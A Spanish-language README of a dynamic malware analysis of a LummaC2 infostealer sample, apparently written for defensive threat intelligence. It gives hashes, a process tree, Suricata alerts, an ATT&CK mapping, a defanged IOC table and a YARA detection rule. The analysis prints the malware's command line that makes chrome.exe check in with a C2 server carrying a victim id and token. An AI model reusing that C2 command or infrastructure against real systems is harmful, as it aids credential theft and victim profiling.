# Análisis Dinámico de Malware y CTI: Infostealer LummaC2

[![Threat](https://img.shields.io/badge/Malware-LummaC2%20%2F%20LummaStealer-critical)](#)
[![Type](https://img.shields.io/badge/Type-Infostealer%20%2F%20MaaS-red)](#)
[![Tools](https://img.shields.io/badge/Tools-ANY.RUN%20%7C%20VirusTotal%20%7C%20Suricata-blue)](#)
[![Framework](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK%20%7C%20Pyramid%20of%20Pain-green)](#)

---

## Resumen Ejecutivo

Este proyecto documenta la investigación técnica y correlación de inteligencia de amenazas (CTI) sobre una variante activa de **LummaC2 (LummaStealer)** empaquetada en lenguaje Go. LummaC2 es un troyano especializado en el robo de información que opera bajo el modelo de *Malware-as-a-Service* (MaaS). 

Mediante un flujo de trabajo integrado que articula el *triage* estático en **VirusTotal** con la detonación dinámica en la sandbox interactiva **ANY.RUN**, se identificaron las rutinas de evasión de defensas (*process masquerading* sobre `chrome.exe`), perfilado de hardware mediante WMI y la infraestructura de Comando y Control (C2). Finalmente, los artefactos extraídos fueron sanitizados (*defanged*), mapeados a la matriz **MITRE ATT&CK** y consolidados en una regla de detección proactiva en formato **YARA**.

> **Reporte Completo:** Se puede consultar el informe técnico extendido con evidencias forenses y capturas en el [archivo](https://drive.google.com/file/d/1ds4kWu5F6mslWRF9U5L6wUqt-KdCHYNO/view?usp=sharing)

---

## Ficha Técnica del Espécimen

| Parámetro | Valor Técnico |
| :--- | :--- |
| **Nombre de archivo original** | `setup.exe` (entregado en `SETUP.zip`) |
| **Hash SHA-256** | `727c152c2f20469adf1743fb4e5de698615b806c0cce4322fa68112a1b74b1b1` |
| **Hash MD5** | `1f19b6fbd4498b5c832645209da3ad7b` |
| **Formato / Arquitectura** | Windows Portable Executable (PE32 / x86_64) |
| **Tamaño del binario** | 4.90 MB (5,138,022 bytes) |
| **Detección Inicial (VirusTotal)**| **40 / 69** motores |
| **Fuente de la muestra** | [MalwareBazaar](https://bazaar.abuse.ch/sample/727c152c2f20469adf1743fb4e5de698615b806c0cce4322fa68112a1b74b1b1/) |

---

## Análisis Dinámico y Comportamiento

### 1. Árbol de Procesos
Durante la sesión interactiva en ANY.RUN, la muestra desplegó una estructura jerárquica orientada al ocultamiento en memoria y evasión de soluciones de monitorización:

```
[PID 6704] WinRAR.exe (Descompresión interactiva)
    └── [PID 1308] 727c152c...b1b1.exe (Malicioso 100/100 - LummaC2 Core)
            └── [PID 888] chrome.exe (Invocación anómala con argumentos de red)
                    ├── [PID 2432] chrome.exe (--type=crashpad-handler)
                    ├── [PID 2244] chrome.exe (--type=gpu-process)
                    ├── [PID 5848] chrome.exe (--type=utility --utility-sub-type=network.mojom...) [Lumma Network Tag]
                    ├── [PID 6080] chrome.exe (--type=utility --utility-sub-type=storage.mojom...)
                    └── [PID 7172 / 7180 / 7272] chrome.exe (--type=renderer)
```

* **Masquerading e Inyección:** El binario principal (`PID 1308`) invocó forzosamente el ejecutable legítimo de Google Chrome (`PID 888`), inyectándole en línea de comandos la dirección del panel C2 junto con identificadores de sesión:
  ```cmd
  "C:\Program Files\Google\Chrome\Application\chrome.exe" grzpoint[.]cyou/api/set_agent?id=1BACFA75E3EE1620F054BFFBFF9CE464&token=75a381410f0eb7b2b9f2c1a2c19ca1b7525ea54dd3fa4dc4&description=&agent=Chrome
  ```
* **Canvas Fingerprinting:** El subproceso de red del navegador ejecutó rutinas de identificación de hardware y entorno gráfico para perfilar de forma única al host antes de iniciar el flujo de exfiltración.

---

### 2. Telemetría de Red y Servidores C2
La sandbox registró **36 alertas críticas de red** disparadas por reglas de **Suricata IDS**:

* **Servidor C2 (Dominio):** `grzpoint[.]cyou`
* **Dirección IPv4:** `64.89.161[.]173` (Puerto 80/TCP - HTTP)
* **Ruta de Endpoint:** `/api/set_agent?...` (Métodos: `GET` y `POST`)
* **User-Agent:** `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36`
* **Alertas Suricata IDS Principales:**
  * `ET MALWARE Win32/Lumma Stealer Related CnC Domain in DNS Lookup`
  * `STEALER [ANY.RUN] Lumma HTTP check-in activity observed (uid=&cid=)`
  * `ET MALWARE Lumma Stealer Victim Fingerprinting Activity` (`T1071`)
  * `ET DROP Spamhaus DROP Listed Traffic Inbound group 10`

---

## 3. Mapeo a MITRE ATT&CK

| Táctica | ID | Técnica / Procedimiento |
| :--- | :--- | :--- |
| **Execution** | `T1047` | Windows Management Instrumentation (WMI) para ejecución y consultas del sistema. |
| **Defense Evasion** | `T1027`<br>`T1497` | Ofuscación del ejecutable en Go y rutinas de evasión de entornos virtualizados/sandbox. |
| **Discovery** | `T1057`<br>`T1082` | Enumeración de procesos en ejecución y descubrimiento de información del sistema. |
| **Collection** | `T1005`<br>`T1555.003` | Extracción de datos locales y sustracción de credenciales almacenadas en navegadores web. |
| **Command & Control** | `T1071`<br>`T1095` | Comunicación con la infraestructura C2 empleando protocolos de capa de aplicación (HTTP/DNS). |

---

## 4. Matriz Consolidada de IOCs (Pirámide del Dolor)

*(Indicadores de red sanitizados mediante defanging para evitar conexiones accidentales)*

| Nivel de Dolor | Tipo de IOC | Valor Identificado | Entorno / Acción Defensiva |
| :--- | :--- | :--- | :--- |
| **Nivel 1: Trivial** | SHA-256 | `727c152c2f20469adf1743fb4e5de698615b806c0cce4322fa68112a1b74b1b1` | Bloqueo en EDR, SIEM y soluciones de antivirus corporativo. |
| **Nivel 1: Trivial** | MD5 | `1f19b6fbd4498b5c832645209da3ad7b` | Barrido y búsqueda forense rápida en endpoints. |
| **Nivel 2: Fácil** | IPv4 (C2) | `64.89.161[.]173:80` | Regla DROP estricta en Firewall perimetral e IPS. |
| **Nivel 3: Simple** | Dominio | `grzpoint[.]cyou` | DNS Sinkholing y filtrado en Secure Web Gateway (SWG). |
| **Nivel 4: Molesto** | URL / Endpoint | `hxxp://grzpoint[.]cyou/api/set_agent` | Bloqueo por firmas de URL en WAF y Proxy corporativo. |
| **Nivel 4: Molesto** | Ruta de Host | `%AppData%\Local\Temp\Rar$...` | Auditoría y restricción de ejecución en `%Temp%`. |
| **Nivel 4: Molesto** | User-Agent | `Mozilla/5.0... Chrome/133.0.0.0 Safari/537.36` | Detección de peticiones HTTP anómalas desde subprocesos. |
| **Nivel 5: Difícil** | Subproceso | Inyección / Masquerading sobre `chrome.exe` | Reglas de detección comportamental en EDR y Sysmon. |
| **Nivel 6: Extremo** | TTPs | Extracción de credenciales web (`T1555.003`) | Deshabilitar autoguardado en navegadores + MFA resistente a phishing. |

---

## 5. Regla de Detección Proactiva (YARA)

```c
rule Win_Infostealer_LummaC2_Variant_2026 { 
    meta: 
        description = "Detecta muestras y variantes activas del infostealer LummaC2 basandose en patrones de C2 y compilacion Go"
        author = "Nicolás Solís C." 
        date = "2026-08-28" 
        version = "1.0" 
        reference = "Analisis Sandbox ANY.RUN / VirusTotal" 
        sample_hash = "727c152c2f20469adf1743fb4e5de698615b806c0cce4322fa68112a1b74b1b1" 

    strings: 
        // Cadenas caracteristicas de la API de comando y control de Lumma 
        $c2_endpoint = "/api/set_agent" ascii wide 
        $c2_token    = "token=" ascii wide 
        $c2_agent    = "&agent=Chrome" ascii wide 

        // Marcadores de comportamiento y strings en memoria 
        $wmi_call    = "calls-wmi" ascii 
        $param_id    = "id=1BACFA" ascii 

    condition: 
        // Verifica cabecera ejecutable PE (MZ) y coincidencia de patrones C2 
        uint16(0) == 0x5A4D and 
        ( 
            ($c2_endpoint and$c2_token) or 
            ($c2_agent and$param_id) or 
            (2 of ($c2_*)) 
        ) 
}
```

---

## Autor

* **Analista:** Nicolás Solís C.
* **Formación:** Técnico Universitario en Ciberseguridad, Desarrollador Full Stack Python
* **Enfoque Técnico:** Análisis de Malware, Threat Hunting y Operaciones SOC (Tier 1/2)